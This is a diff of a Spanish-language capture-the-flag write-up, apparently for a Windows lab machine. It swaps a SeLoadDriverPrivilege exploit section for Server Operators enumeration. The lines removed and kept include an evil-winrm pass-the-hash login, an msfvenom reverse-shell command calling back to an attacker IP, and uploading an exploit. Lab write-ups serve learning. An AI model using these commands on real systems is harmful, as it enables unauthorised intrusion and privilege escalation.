@@ -104,32 +104,15 @@ evil-winrm -i 10.129.95.241 -u Administrator -H 34386a771aaca697f447754e4863d38a
 
 Pero en este caso nos esta rechazando la conexión así que la escalada de privilegios lleva otro camino
 
-También tenemos privilegios en `SeLoadDriverPrivilege`
-
-## SeLoadDriverPrivilege
-Este privilegio nos permite cargar y descargar drivers, permitiéndonos subir un driver malicioso y al ser ejecutado en el kernel poder obtener acceso como `ADministrator`
-
-Para esta explotación usaremos `https://github.com/JoshMorrison99/SeLoadDriverPrivilege`
-
-Nos clonamos el repositorio
+Veremos también los grupos a los que pertenece el usuario en esta caso pertenece a `Server Operators` 
 ```shell
-git clone https://github.com/JoshMorrison99/SeLoadDriverPrivilege.git
+net user svc-printer
 ```
 
-Nos creamos una `Reverse Shell` con [[MSFVENOM]]
-```shell
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.165 LPORT=4444 -f exe -o rev.exe
-```
+El pertenecer a este grupo se nos permite administrar controladores de dominio pudiendo correr y parar servicios
 
-Nos subimos los ficheros del repositorio clonado a la maquina victima con
+Enumeraremos los servicios con el comando 
 ```shell
-upload ./SeLoadDriverPrivilege/*
+services
 ```
-
-Subimos también nuestra shell
-```shell
-upload rev.exe
-```
-
-Nos ponemos en escucha en el puerto `4444`
 
